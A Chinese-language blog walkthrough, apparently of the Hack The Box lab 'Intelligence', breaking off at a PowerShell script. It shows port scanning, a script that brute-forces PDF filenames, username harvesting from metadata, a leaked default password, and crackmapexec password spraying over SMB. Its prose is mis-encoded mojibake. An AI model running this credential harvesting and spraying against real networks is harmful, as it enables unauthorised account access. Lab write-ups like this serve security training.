<!DOCTYPE html>
<html>
<head>
    

    

    



    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
    
    
    
    
    <title>Intelligence - Hackthebox | Lucifiel&#39;s Blog | Lucifiel æŠ€æœ¯åšå®¢</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="theme-color" content="#3F51B5">
    
    
    <meta name="keywords" content="Hackthebox">
    <meta name="description" content="Hackthebox - Intelligenceé¶åœºä¿¡æ¯                                                                                                            é¶åœºç±»å‹">
<meta property="og:type" content="article">
<meta property="og:title" content="Intelligence - Hackthebox">
<meta property="og:url" content="http://www.lucifiel.com/2021/07/07/Hackthebox%20-%20Intelligence/index.html">
<meta property="og:site_name" content="Lucifiel&#39;s Blog">
<meta property="og:description" content="Hackthebox - Intelligenceé¶åœºä¿¡æ¯                                                                                                            é¶åœºç±»å‹">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://www.lucifiel.com/2021/07/07/Hackthebox%20-%20Intelligence/0fbbe52d-ffed-4a1d-9efd-c4a3e05dfdae.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/07/07/Hackthebox%20-%20Intelligence/f802a0be-11ff-4a50-a09e-e245361bf800.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/07/07/Hackthebox%20-%20Intelligence/0b06ca38-286b-4cce-b25e-2e71021ff83d.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/07/07/Hackthebox%20-%20Intelligence/557cee9f-1385-41ab-96de-a13577a24dfc.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/07/07/Hackthebox%20-%20Intelligence/ee74b2f4-0616-465e-8113-87e5240183cf.png">
<meta property="article:published_time" content="2021-07-07T11:38:36.000Z">
<meta property="article:modified_time" content="2023-05-20T01:54:29.873Z">
<meta property="article:author" content="Lucifiel">
<meta property="article:tag" content="Hackthebox">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://www.lucifiel.com/2021/07/07/Hackthebox%20-%20Intelligence/0fbbe52d-ffed-4a1d-9efd-c4a3e05dfdae.png">
    
        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
    
    <link rel="shortcut icon" href="/favicon.ico">
    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
    <script>window.lazyScripts=[]</script>

    <!-- custom head -->
    

<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>

<body>
    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>

    <aside id="menu" class="hide" >
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">Lucifiel</h5>
          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
        </hgroup>
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="waves-block waves-effect">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                ä¸»é¡µ
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                Archives
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                Tags
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                Categories
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://github.com/LucifielHack" target="_blank" >
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/about"  >
                <i class="icon icon-lg icon-user"></i>
                About
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row">
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">Intelligence - Hackthebox</div>
        
        <div class="search-wrap" id="search-wrap">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                <i class="icon icon-lg icon-chevron-left"></i>
            </a>
            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="è¾“å…¥æ„Ÿå…´è¶£çš„å…³é”®å­—">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                <i class="icon icon-lg icon-search"></i>
            </a>
        </div>
        
        
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
            <i class="icon icon-lg icon-share-alt"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">

    <div class="container fade-scale">
        <h1 class="title">Intelligence - Hackthebox</h1>
        <h5 class="subtitle">
            
                <time datetime="2021-07-07T11:38:36.000Z" itemprop="datePublished" class="page-time">
  2021-07-07
</time>


            
        </h5>
    </div>

    


</header>


<div class="container body-wrap">
    
    <aside class="post-widget">
        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
            <h4>TOC</h4>
            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Hackthebox-Intelligence"><span class="post-toc-number">1.</span> <span class="post-toc-text">Hackthebox - Intelligence</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#é¶åœºä¿¡æ¯"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">é¶åœºä¿¡æ¯</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#é¶åœºç±»å‹"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">é¶åœºç±»å‹</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#ä¿¡æ¯æœé›†"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">ä¿¡æ¯æœé›†</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#æ¼æ´åˆ©ç”¨"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">æ¼æ´åˆ©ç”¨</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#æƒé™æå‡"><span class="post-toc-number">1.5.</span> <span class="post-toc-text">æƒé™æå‡</span></a></li></ol></li></ol>
        </nav>
    </aside>


<article id="post-Hackthebox - Intelligence"
  class="post-article article-type-post fade" itemprop="blogPost">

    <div class="post-card">
        <h1 class="post-card-title">Intelligence - Hackthebox</h1>
        <div class="post-meta">
            <time class="post-time" title="2021-07-07 19:38:36" datetime="2021-07-07T11:38:36.000Z"  itemprop="datePublished">2021-07-07</time>

            


            
<span id="busuanzi_container_page_pv" title="æ–‡ç« æ€»é˜…è¯»é‡" style='display:none'>
    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
</span>


        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            <h1 id="Hackthebox-Intelligence"><a href="#Hackthebox-Intelligence" class="headerlink" title="Hackthebox - Intelligence"></a>Hackthebox - Intelligence</h1><h2 id="é¶åœºä¿¡æ¯"><a href="#é¶åœºä¿¡æ¯" class="headerlink" title="é¶åœºä¿¡æ¯"></a>é¶åœºä¿¡æ¯</h2><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2021/07/07/Hackthebox%20-%20Intelligence/0fbbe52d-ffed-4a1d-9efd-c4a3e05dfdae.png" alt title>
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="é¶åœºç±»å‹"><a href="#é¶åœºç±»å‹" class="headerlink" title="é¶åœºç±»å‹"></a>é¶åœºç±»å‹</h2><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2021/07/07/Hackthebox%20-%20Intelligence/f802a0be-11ff-4a50-a09e-e245361bf800.png" alt title>
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h2><p>é¦–å…ˆä½¿ç”¨nmapè¿›è¡Œç«¯å£æ‰«æ</p>
<pre><code class="Plain">â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]
â””â”€# nmap -A -sS -sC -sV -p- 10.10.10.248
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-07 09:27 CST
Nmap scan report for 10.10.10.248
Host is up (0.24s latency).
Not shown: 65515 filtered ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Intelligence
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-07-07 08:49:30Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2021-07-07T08:51:09+00:00; +7h12m23s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2021-07-07T08:51:10+00:00; +7h12m23s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2021-07-07T08:51:09+00:00; +7h12m23s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2021-07-07T08:51:10+00:00; +7h12m23s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc         Microsoft Windows RPC
49688/tcp open  msrpc         Microsoft Windows RPC
49700/tcp open  msrpc         Microsoft Windows RPC
58859/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h12m22s, deviation: 0s, median: 7h12m22s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2021-07-07T08:50:31
|_  start_date: N/A

TRACEROUTE (using port 139/tcp)
HOP RTT       ADDRESS
1   241.20 ms 10.10.14.1
2   241.20 ms 10.10.10.248

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 648.79 seconds
</code></pre>
<p>åœ¨ä¸Šé¢æˆ‘ä»¬å¾—åˆ°çš„é‡è¦ä¿¡æ¯æœ‰ï¼š</p>
<ul>
<li>å¼€å¯80ç«¯å£çš„HTTPæœåŠ¡</li>
<li>å¼€å¯SMBæœåŠ¡ </li>
<li>æœ‰ä¸¤ä¸ªåŸŸå<code>intelligence.htb</code>å’Œ<code>dc.intelligence.htb</code> </li>
<li>æœ‰<code>Kerberos</code>å¯èƒ½æ¶‰åŠå†…ç½‘æ¸—é€</li>
</ul>
<p>å’±ä»¬ä¸€ä¸ªä¸€ä¸ªæ¥çœ‹ï¼Œé¦–å…ˆå…ˆæŠŠåŸŸåæ·»åŠ åˆ°hostsé‡Œ</p>
<pre><code class="Plain">echo 10.10.10.248 dc.intelligence.htb intelligence.htb &gt; /etc/hosts
</code></pre>
<p>ç„¶åå’±ä»¬å»æŸ¥çœ‹ä¸€ä¸‹è¿™ä¸¤ä¸ªåŸŸå</p>
<p>è¿™ä¸¤ä¸ªåŸŸåçš„å†…å®¹ä¼¼ä¹æ˜¯ä¸€æ ·çš„ï¼Œæ‰¾åˆ°äº†ä¸¤ä¸ªPDFæ–‡ä»¶</p>
<pre><code class="Plain">http://intelligence.htb/documents/2020-12-15-upload.pdf
http://intelligence.htb/documents/2020-01-01-upload.pdf
</code></pre>
<p>ç¿»è¯‘åæ²¡çœ‹åˆ°ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯ï¼Œä½†æ¯•ç«Ÿæ˜¯PDFæ–‡ä»¶ï¼Œå’±ä»¬ä½¿ç”¨<code>exiftool</code>è¿›è¡ŒæŸ¥çœ‹</p>
<pre><code class="Plain">exiftool 2020-01-01-upload.pdf
</code></pre>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2021/07/07/Hackthebox%20-%20Intelligence/0b06ca38-286b-4cce-b25e-2e71021ff83d.png" alt title>
                </div>
                <div class="image-caption"></div>
            </figure>

<pre><code class="Plain">exiftool 2020-12-15-upload.pdf
</code></pre>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2021/07/07/Hackthebox%20-%20Intelligence/557cee9f-1385-41ab-96de-a13577a24dfc.png" alt title>
                </div>
                <div class="image-caption"></div>
            </figure>

<p>åœ¨PDFæ–‡ä»¶ä¸­è¯»å–åˆ°äº†ä¸€ä¸ªåä¸º<code>Creator</code>çš„å­—æ®µï¼Œè¿™ä¸ªä¸€èˆ¬ä¸æ˜¯æ­£å¸¸æƒ…å†µï¼Œå…ˆè®°å½•ä¸€ä¸‹å§ã€‚</p>
<pre><code class="Plain">William.Lee
Jose.Williams
</code></pre>
<p>è¿™ä¸ªå¯èƒ½æ˜¯ä¸¤ä¸ªç”¨æˆ·å</p>
<p>æˆ‘ä»¬è§‚å¯Ÿä¸€ä¸‹è¿™ä¸¤ä¸ªpdfæ–‡ä»¶çš„å‘½åè§„åˆ™ï¼Œä¼šå‘ç°ï¼Œå˜åŠ¨çš„åªæœ‰æ—¥æœŸã€‚é‚£ä¹ˆï¼Œæ˜¯å¦è¿˜æœ‰å…¶ä»–çš„pdfæ–‡ä»¶å‘¢ï¼Ÿè®©æˆ‘ä»¬æµ‹è¯•ä¸€ä¸‹</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2021/07/07/Hackthebox%20-%20Intelligence/ee74b2f4-0616-465e-8113-87e5240183cf.png" alt title>
                </div>
                <div class="image-caption"></div>
            </figure>

<p>å¯ä»¥çœ‹åˆ°ï¼Œç¡®å®æ˜¯å­˜åœ¨çš„ã€‚</p>
<p>ç„¶åï¼Œæˆ‘æ‰¾åˆ°äº†ä¸€ä¸ªè„šæœ¬ï¼Œæ„Ÿè°¢<code>kavigihan</code>å¸ˆå‚…å†™çš„è„šæœ¬</p>
<pre><code class="Plain">#!/usr/bin/python3
# Author: kavigihan

import requests
import os

def fuzz_PDFs():
    with open(&#39;days&#39;, &#39;r&#39;) as d:
        days = d.readlines()

    with open(&#39;months&#39; ,&#39;r&#39;) as m:
        months = m.readlines()

    url_file = open(&#39;urls&#39;, &#39;w&#39;)
    url_file.close()

    for month in months:
        for day in days:
            r = requests.get(f&#39;http://dc.intelligence.htb/documents/2020-{day.strip()}-{month.strip()}-upload.pdf&#39;)
            if int(r.status_code) == 200:
                print(f&#39;http://dc.intelligence.htb/documents/2020-{day.strip()}-{month.strip()}-upload.pdf&#39;)

                with open(&#39;urls&#39;, &#39;a&#39;) as url_file:
                    url_file.write(f&#39;http://dc.intelligence.htb/documents/2020-{day.strip()}-{month.strip()}-upload.pdf&#39;)
                    url_file.write(&#39;\n&#39;)

def get_PDFs():
    with open(&#39;urls&#39;, &#39;r&#39;) as u:
        urls = u.readlines()

    for url in urls:
        os.system(f&quot;wget -q {url.strip()} &quot;)
        print(f&#39;[+] Downloading -- {url.strip()} &#39;)

fuzz_PDFs()
get_PDFs()
</code></pre>
<p>ä¿å­˜åˆ°æœ¬åœ°ï¼Œç„¶åç”Ÿæˆä¸¤ä¸ªå­—å…¸</p>
<pre><code class="Plain">seq 1 31 &gt; days; seq 1 12 &gt; months
</code></pre>
<p>è®°å¾—æ‰‹åŠ¨åœ¨ç”Ÿæˆå‡ºæ¥çš„å­—å…¸å†…ï¼ŒæŠŠ1-9æ·»åŠ ä¸Š0ï¼Œæ¯”å¦‚1æœˆå°±æ”¹ä¸º01æœˆ</p>
<p>ç„¶åæ‰§è¡Œè¯¥è„šæœ¬</p>
<pre><code class="Plain">python3 exploit.py
</code></pre>
<p>ä½¿ç”¨å‘½ä»¤</p>
<pre><code class="Plain">cat *.pdf|strings |grep Creator|cut -d &#39;(&#39; -f 2|cut -d &#39;)&#39; -f 1|grep -v TeX &gt; users;cat users
</code></pre>
<p>ææƒpdfæ–‡ä»¶å†…çš„ç”¨æˆ·å</p>
<pre><code class="Plain">â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]
â””â”€# cat *.pdf|strings |grep Creator|cut -d &#39;(&#39; -f 2|cut -d &#39;)&#39; -f 1|grep -v TeX &gt; users;cat users
William.Lee
Scott.Scott
Jason.Wright
Veronica.Patel
Jose.Williams
Brian.Morris
Jennifer.Thomas
Thomas.Valenzuela
David.Mcbride
Jose.Williams
Anita.Roberts
Brian.Baker
Jose.Williams
David.Mcbride
David.Reed
Kaitlyn.Zimmerman
Jason.Patterson
Thomas.Valenzuela
David.Mcbride
Darryl.Harris
David.Wilson
Scott.Scott
Teresa.Williamson
John.Coleman
Samuel.Richardson
Ian.Duncan
Jason.Wright
Travis.Evans
David.Mcbride
Jessica.Moody
Ian.Duncan
Anita.Roberts
Kaitlyn.Zimmerman
Jose.Williams
Stephanie.Young
Samuel.Richardson
Tiffany.Molina
Ian.Duncan
</code></pre>
<p>æ¥ç€åœ¨æ–‡ä»¶<code>2020-06-04-upload.pdf</code>ä¸­å‘ç°äº†ä¸€ä¸ªé»˜è®¤å¯†ç </p>
<pre><code class="Plain">New Account Guide
Welcome to Intelligence Corp!
Please login using your username and the default password of:
NewIntelligenceCorpUser9876
After logging in please change your password as soon as possible.
</code></pre>
<p>ä½¿ç”¨exiftoolæŸ¥çœ‹è¯¥pdfï¼Œè·å¾—äº†ç”¨æˆ·å<code>Jason.Patterson</code>ï¼Œè¿™æ ·æˆ‘ä»¬å°±æœ‰äº†ä¸€ä¸ªè´¦æˆ·å¯†ç </p>
<pre><code class="Plain">username = Jason.Patterson
password = NewIntelligenceCorpUser9876
</code></pre>
<p>å’±ä»¬ç›´æ¥ä½¿ç”¨smbè¿›è¡Œç™»å½•</p>
<pre><code class="Plain">smbclient -L //10.10.10.248 -U Tiffany.Molina
</code></pre>
<p>ä½†å½“æˆ‘å°è¯•ç™»å½•çš„æ—¶å€™ï¼Œå´æç¤ºæˆ‘å¤±è´¥äº†ã€‚ä¼°è®¡æ˜¯è´¦æˆ·å¯†ç ä¸åŒ¹é…ï¼Œæ²¡åŠæ³•ï¼Œåªèƒ½çˆ†ç ´ä¸€æ³¢äº†</p>
<pre><code class="Plain">ä½¿ç”¨crackmapexecè¿›è¡Œçˆ†ç ´
crackmapexec smb 10.10.10.248 -u users -p â€œNewIntelligenceCorpUser9876â€
</code></pre>
<pre><code class="Plain">â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]
â””â”€# crackmapexec smb 10.10.10.248 -u users -p NewIntelligenceCorpUser9876
[*] Initializing LDAP protocol database
[*] Generating SSL certificate
SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.248    445    DC               [-] intelligence.htb\William.Lee:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Scott.Scott:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jason.Wright:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Veronica.Patel:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Brian.Morris:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jennifer.Thomas:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Thomas.Valenzuela:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Anita.Roberts:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Brian.Baker:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Reed:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Kaitlyn.Zimmerman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jason.Patterson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Thomas.Valenzuela:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Darryl.Harris:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Wilson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Scott.Scott:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Teresa.Williamson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\John.Coleman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Samuel.Richardson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Ian.Duncan:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jason.Wright:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Travis.Evans:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jessica.Moody:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Ian.Duncan:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Anita.Roberts:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Kaitlyn.Zimmerman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Stephanie.Young:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Samuel.Richardson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876
</code></pre>
<p>æˆåŠŸè·å¾—æ­£ç¡®çš„smbè´¦å·å’Œå¯†ç </p>
<pre><code class="Plain">username = Tiffany.Molina
password = NewIntelligenceCorpUser9876
</code></pre>
<p>ç™»å½•smbè¿›è¡ŒæŸ¥çœ‹</p>
<pre><code class="Plain">â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]
â””â”€# smbclient -L //10.10.10.248 -U Tiffany.Molina
Enter WORKGROUP\Tiffany.Molina&#39;s password:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        IT              Disk
        NETLOGON        Disk      Logon server share
        SYSVOL          Disk      Logon server share
        Users           Disk
SMB1 disabled -- no workgroup available
</code></pre>
<p>ç™»å½•æˆåŠŸï¼Œå’±ä»¬æŸ¥æ‰¾ä¸€ä¸‹çœ‹çœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆå¯åˆ©ç”¨çš„æ–‡ä»¶å§</p>
<p>å¯ä»¥æŸ¥çœ‹çš„å°±<code>IT</code>å’Œ<code>Users</code>ç›®å½•ï¼Œå’±ä»¬åˆ†åˆ«å»æŸ¥çœ‹ä¸€ä¸‹</p>
<pre><code class="Plain">smbclient //10.10.10.248/IT -U Tiffany.Molina
smbclient //10.10.10.248/Users -U Tiffany.Molina
</code></pre>
<p>åœ¨ITç›®å½•ä¸‹æ‰¾åˆ°äº†ä¸€ä¸ªps1çš„æ–‡ä»¶</p>
<pre><code class="Plain">â”€â”€(rootğŸ’€root)-[~/Desktop]
â””â”€# smbclient //10.10.10.248/IT -U Tiffany.Molina                                                                                                                                                           130 â¨¯
Enter WORKGROUP\Tiffany.Molina&#39;s password:
Try &quot;help&quot; to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Mon Apr 19 08:50:55 2021
  ..                                  D        0  Mon Apr 19 08:50:55 2021
  downdetector.ps1                    A     1046  Mon Apr 19 08:50:55 2021

                3770367 blocks of size 4096. 1330536 blocks available
smb: \&gt; get downdetector.ps1
getting file \downdetector.ps1 of size 1046 as downdetector.ps1 (1.1 KiloBytes/sec) (average 1.1 KiloBytes/sec)
</code></pre>
<p>å…ˆä¸‹è½½ä¸‹æ¥ï¼Œå’±ä»¬å»çœ‹çœ‹usersç›®å½•</p>
<p>åœ¨<code>Users\Tiffany.Molina\Desktop</code>ä¸‹æ‰¾åˆ°äº†user.txtæ–‡ä»¶</p>
<pre><code class="Plain">smb: \Tiffany.Molina\Desktop\&gt; get user.txt
getting file \Tiffany.Molina\Desktop\user.txt of size 34 as user.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
</code></pre>
<pre><code class="Plain">â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]
â””â”€# cat user.txt                                                                                                                                                                                              1 âš™
6d148717e36be40a48439bdf34ea3054
</code></pre>
<p>æˆåŠŸè·å¾—useræƒé™çš„flagæ–‡ä»¶</p>
<h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>æŸ¥çœ‹ä¸€ä¸‹<code>downdetector.ps1</code>æ–‡ä»¶çš„å†…å®¹</p>
<pre><code class="Plain">â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]
â””â”€# cat downdetector.ps1                                                                                                                                                                                      1 âš™
ï¿½ï¿½# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory
foreach($record in Get-ChildItem &quot;AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb&quot; | Where-Object Name -like &quot;web*&quot;)  {
try {
